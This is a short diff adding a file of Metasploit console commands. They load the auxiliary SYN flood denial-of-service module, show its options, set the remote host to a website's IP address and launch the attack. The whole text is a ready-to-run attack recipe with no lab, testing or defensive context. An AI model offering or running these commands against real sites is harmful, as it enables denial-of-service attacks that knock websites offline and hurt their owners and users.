@@ -1,0 +1,5 @@
+Commands : :
+use auxiliary/dos/tcp/synflood
+show options
+set RHOST (IP ADDRESS OF WEBSITE)
+exploit
